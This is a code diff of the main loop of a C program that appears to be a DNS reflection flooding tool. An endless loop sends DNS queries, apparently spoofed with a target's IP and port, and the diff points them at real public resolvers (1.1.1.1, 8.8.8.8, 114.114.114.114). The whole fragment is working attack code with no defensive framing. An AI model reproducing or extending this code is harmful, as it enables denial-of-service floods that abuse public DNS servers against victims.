@@ -53,10 +53,9 @@ int main(int argc, char **argv)
 	//while(1)
 		//dns_send(trgt_ip, trgt_p, dns_srv, 53, dns_rcrd);
 	while(1) {
-		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "www.google.com");
-		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "ietf.org");
-		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "www.amazon.com");
-		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "ieee.org");
+		dns_send(trgt_ip, trgt_p, "1.1.1.1", 53, "www.google.com");
+		dns_send(trgt_ip, trgt_p, "8.8.8.8", 53, "ietf.org");
+		dns_send(trgt_ip, trgt_p, "114.114.114.114", 53, "www.amazon.com");
 	}	
 	return 0;
 }
